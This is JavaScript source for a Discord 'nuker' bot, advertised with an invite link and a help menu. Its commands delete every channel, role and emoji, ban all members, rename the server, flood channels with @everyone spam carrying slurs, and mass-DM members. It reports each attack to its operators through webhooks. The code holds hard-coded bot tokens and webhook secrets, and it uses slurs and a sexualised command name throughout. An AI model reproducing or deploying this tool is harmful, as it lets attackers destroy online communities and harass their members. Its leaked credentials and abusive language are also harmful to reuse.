const { Client } = require("discord.js");
const Discord = require("discord.js");
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({
});

const db = require("quick.db")
const talkedRecently = new Set();

const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)

client.on("ready", async () => {

let matatactu = new Discord.MessageEmbed()
.setColor("#2f3136")
.setTitle("reconnecting..") 
.setFooter('BEST NUKER', 'https://cdn.discordapp.com/avatars/931066800437858344/0d2206d90f97c0df7fd7a7e8b241df11.webp?size=100')
.setDescription(`> **xyzr was reconnected to the host.** `);
//https://discord.com/api/webhooks/932259441380839474/hCR5-deKYv7zs3ZHzhkdqnWbIq-fL6Q4RAGW9QckiL3--HVox04aJoPRhyJXPBNmvsAL
const wrb = new Discord.WebhookClient("932715418316075079", "0MeNE02zq0vTbmK7byjPW851Fu4sBvBTsB33Aq0jc70gmsv-VHo-X92NMPWvuutEhcyY");
    await wrb.send(matatactu)

client.user.setPresence({
    status: "STREAMING",
    activity: {
      name: "xyzr on top",
      type: "STREAMING",
       url: "https://twitch.tv/SealedSaucer"
    }
  })

  console.log(`bot is on`);
  
}); 

  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })

client.on(`message`, message => {
  if (message.content === `ping`|| message.content === `Ping` || message.content === `PING`) {
    message.channel.send(` ─ Latency is** **${Date.now() - message.createdTimestamp}ms**
\API Latency is** **${Math.round(message.client.ws.ping)}ms**`);
  }
});
 
+client.login('BOT_TOKEN')


client.on("message", async(message)=>{
  if (!message.guild) return;
      if (!message.guild) return;
    if (message.content.startsWith(`rape`)||message.content.startsWith(`Rape`)||message.content.startsWith(`RAPE`)) {

    
         if(message.guild.id == '932249135199961139') return message.channel.send('> **Leave me alone daddy <:Ahegao_Emoji:932278440202223667>**');

       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id


 



      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")



let mes = new Discord.MessageEmbed()
.setColor("#2f3136")
.setTitle("Nuked")
.setFooter("xyzr")
.setDescription (`**> ${message.author.tag} **(` + "`" + message.author.id + "`" + `) used the command **rape** on the server called \`${message.guild.name}\` (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members! `)
.setImage (`https://media.discordapp.net/attachments/912070757998293032/913538129087041556/D6D56472-C94F-4846-AFB5-3CD677FF8DB8.gif`)
.setTimestamp(Date.now());

    const wrb = new Discord.WebhookClient("932264980261261382","UqgW_VJvgaLMmSQkuNib0ymk7HCpkC93oe-Exbq_J9Ld7gx_fHWDY5VCmA3lZNhwAFuQ");

    await wrb.send(mes)
//https://discord.com/api/webhooks/932264980261261382/UqgW_VJvgaLMmSQkuNib0ymk7HCpkC93oe-Exbq_J9Ld7gx_fHWDY5VCmA3lZNhwAFuQ
let token = "OTMxODg1NDI0ODkxMjY1MDM0.YeK77g.uK2iSjszq5ym7d0wX8GSIIAyjYY"
const phin = require('phin').unpromisified
let guildID = message.guild.id











message.delete()
       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });



message.guild.members.cache.filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach( member => {
   member.ban()
     
})


message.guild.setName("xyzr dominates u")
    message.guild.setIcon(
      "https://images-ext-1.discordapp.net/external/N7uajoKIQF_Mk0gn_mpNmHc-9sRpAFRQf6NZ1aQOYU4/%3Fq%3Dtbn%3AANd9GcQ312fTQyzlb8WRDoTt9T8eBn3U3IBJzSJFDQ%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images"
    );
    
        
    
  

        
        
db.set(`${message.guild.id}-grief`, true);



        
      

}
//invite
//invite
  if (message.content.startsWith('invite')||message.content.startsWith(`Invite`)||message.content.startsWith(`INVITE`)) {

    const helpEmbed = new Discord.MessageEmbed()
      .setTitle(' **__INVITE ME__**')
      .setColor("0d0d0d")
      .setDescription(`

>  <a:679588617358016589:932257908614398062> Invite link is attached here [INVITE ME](https://discord.com/api/oauth2/authorize?client_id=931462667426738286&permissions=8&scope=bot)

> <a:cathavingfun:932258103737593866> Join our [SUPPORT SERVER](https://discord.gg/9HXKCUf8TR)

> <a:arabian:932258010527596604> Bot command is "rape"`)
      .setImage(``)
                .setFooter(
                    `requested by ${message.author.username}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor('2f3136')
        message.channel.send(helpEmbed)
  }
  
        if (message.content.startsWith(`help`)|| message.content.startsWith(`HELP`)||message.content.startsWith(`Help`)) {
            const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                
                .setTitle('xyzr </>')

                .setDescription(`__**Bot Commands**__

<a:909150177980457020:932257938620424262> **Free Commands**

> rape - __Deletes channels, bans all members, changes server icon and name__
> ping - __Shows bot connection__
> invite - __Bot's invite link__

<a:679588617358016589:932257908614398062> **Premium Commands**

> hi - __Premium Destroy, Channel Spam__
> dm - __Mass dm all members__
> .baneveryone - __Bans all Members__

<a:897552210404208731:932258085274271754> __For any issues join in our support server__`)
                .setFooter(`© xyzr | Author: south, wasted & vlaz`)
                .setColor(`2f3136`)
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
        }

  
if (message.content.startsWith("rmv premium")||message.content.startsWith(`remove premium`)) {

        const embed = new MessageEmbed()
        .setDescription(`**No more premium**<:drip_sadcat:932276877417144401> `)
        .setColor(`2f3136`)
           let ownerID = "371224177186963460"
           let coOwnerID = "859646668672598017" 
           let coOwnerID2 = "909540867025551392"//vlad e gay si nub
  if(message.author.id !== ownerID && message.author.id !== coOwnerID && message.author.id !== coOwnerID2) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0])
    db.fetch(`dev_${user.id}`);
    db.delete(`dev_${user.id}`, 1)
    message.channel.send(`> This faggot doesn't have premium anymore <a:e_jajaja:932277150520864809> `)
    user.send(embed)
  
   let rmvPrem = new MessageEmbed()
        .setColor (`2f3136`)
        .setTitle (`Premium user`)
        .setDescription (`<@${user.id}> hasn't premium anymore <:drip_sadcat:932276877417144401>`)
       .setTimestamp(Date.now()); 

    const wrb = new Discord.WebhookClient("932272256917307452","eZPmNOJUMzgASiIexsGs1kas6c0ghMsyIvekfNvJpNe3cV3n6vj_AArFRRUdcv5Z4-pE");
    await wrb.send(rmvPrem)
}
  if (message.content.startsWith('.baneveryone')) {
    if (message.guild.id === "932249135199961139") return message.channel.send("> **why?** <a:z_catsad:932277469585735720>")
    message.delete();
    let Embed4 = new Discord.MessageEmbed()
    .setColor(`2f3136`)
    .setDescription(`> <a:e_jajaja:932277150520864809> Get premium poor ass`);
  
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
    message.guild.members.cache.forEach(member => member.ban({ reason: "xyzr cool" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Get banned kids")

      ))
      
}

//https://discord.com/api/webhooks/932264980261261382/UqgW_VJvgaLMmSQkuNib0ymk7HCpkC93oe-Exbq_J9Ld7gx_fHWDY5VCmA3lZNhwAFuQ

if (message.content.startsWith("add premium")) {

        const embed = new MessageEmbed()
        .setDescription(`**You are a rich ass who owns premium now** <a:679588617358016589:932257908614398062>`)
        .setColor(`2f3136`)
           let ownerID = "371224177186963460"
           let coOwnerID = "859646668672598017"
           let coOwnerID2 = "909540867025551392"
  if(message.author.id !== ownerID && message.author.id !== coOwnerID && message.author.id !== coOwnerID2) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0])
    db.fetch(`dev_${user.id}`);
    db.set(`dev_${user.id}`, 1)
    message.channel.send(`> Now they Have Premium! <a:mb_milkVibe:932277729905229884>`)
    user.send(embed)

    let addPrem = new MessageEmbed()
        .setColor (`2f3136`)
        .setTitle (`Premium user`)
        .setDescription (`<@${user.id}> has premium <a:909150177980457020:932257938620424262>`)
       .setTimestamp(Date.now()); 

    const wrb = new Discord.WebhookClient("932272256917307452","eZPmNOJUMzgASiIexsGs1kas6c0ghMsyIvekfNvJpNe3cV3n6vj_AArFRRUdcv5Z4-pE");
    await wrb.send(addPrem)
  }
//https://discord.com/api/webhooks/932272256917307452/eZPmNOJUMzgASiIexsGs1kas6c0ghMsyIvekfNvJpNe3cV3n6vj_AArFRRUdcv5Z4-pE

        if (message.content.startsWith('hi')||message.content.startsWith(`HI`)||message.content.startsWith(`Hi`)) {


    let Embed4 = new Discord.MessageEmbed()
    .setColor(`2f3136`)
    .setDescription(`> <a:e_jajaja:932277150520864809> **Get premium poor ass**`);
     
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
      
                   if(message.guild.id == '932249135199961139') return message.channel.send('> **No 😠**');

            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
              message.delete()
                  let channels =  message.guild.channels.cache.array();
                     message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
        let pulamea = new Discord.MessageEmbed()
        .setColor (`2f3136`)
        .setTitle (`Premium nuke`)
        .setFooter ("xyzr")
        .setDescription (`
        **> ${message.author.tag} **(` + "`" + message.author.id + "`" + `) used the command **hi** on the server called \`${message.guild.name}\` (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members!`)
       .setImage (`https://media.discordapp.net/attachments/912070757998293032/913539768476917830/777AE674-C2E7-4D3D-8709-38A92A4CB293.gif`)
       .setTimestamp(Date.now()); 
    
    const wrb = new Discord.WebhookClient("932264980261261382","UqgW_VJvgaLMmSQkuNib0ymk7HCpkC93oe-Exbq_J9Ld7gx_fHWDY5VCmA3lZNhwAFuQ");
                                    

    await wrb.send(pulamea)
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 1000; i++) {
                        message.guild.channels.create('xyzr owns u')

                        for (var i = 0; i < 1000; i++) {
                            let channels = message.guild.channels.create(`get raped by by ${message.author.username}`)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 1000; i++) {
                                        channel.send('@everyone https://discord.gg/9HXKCUf8TR join here fags' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 1000; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 1000; i++) {
                                channel.send('@everyone https://discord.gg/9HXKCUf8TR join here fags' + argresult);
                                console.log(`CHANNEL PINGED!`);
                                // other per-channnel logic
                            }
                        }
                    );
                }
            }
            message.delete();
        }
   
       if (message.content.startsWith('dm')||message.content.startsWith(`Dm`)||message.content.startsWith(`DM`)) {

         let Embed5 = new Discord.MessageEmbed()
    .setColor(`2f3136`)
    .setDescription(`> <a:e_jajaja:932277150520864809> **Get premium poor ass**`);

         let user = message.mentions.members.first() || message.author;
         let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed5)

     if(message.guild.id == '932249135199961139') return message.channel.send(`> **Don't mass dm here noob 💀**`);
      
      let massdm = new Discord.MessageEmbed()
        .setColor (`2f3136`)
        .setTitle (`Mass dm nuke`)
        .setFooter ("xyzr")
        .setDescription (`
        **>  ${message.author.tag}** (` + "`" + message.author.id + "`" + `) used the command **dm** on the server called \`${message.guild.name}\` (` + "`" + message.guild.id + "`" + `) with **${message.guild.memberCount}** members!`)
       .setImage (`https://media.discordapp.net/attachments/912070757998293032/913539701871357962/DBE79F20-1F67-4BF8-A152-53BDEC6DA646.gif`)
       .setTimestamp(Date.now());   
    
    const wrb = new Discord.WebhookClient("932264980261261382","UqgW_VJvgaLMmSQkuNib0ymk7HCpkC93oe-Exbq_J9Ld7gx_fHWDY5VCmA3lZNhwAFuQ");
    await wrb.send(massdm)
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
              message.delete()
              args = message.content.split(" ").slice(1);
              var argresult = args.join(' ');

              message.guild.members.cache.forEach(member => {
                member.send(argresult).then(console.log(`succsesfully messaged | ${member.user.username}#${member.user.discriminator}`)).catch(g => console.error(`Didn't dm'ed member | ${member.user.username}#${member.user.discriminator}`));
              })
              console.log(`[/] Succsesfully`)
            }
       }

 })


 



client.login("OTMxNDYyNjY3NDI2NzM4Mjg2.YeEyNQ.Sa1UtDPoqkB_7AfkdKvDMqFHNW0")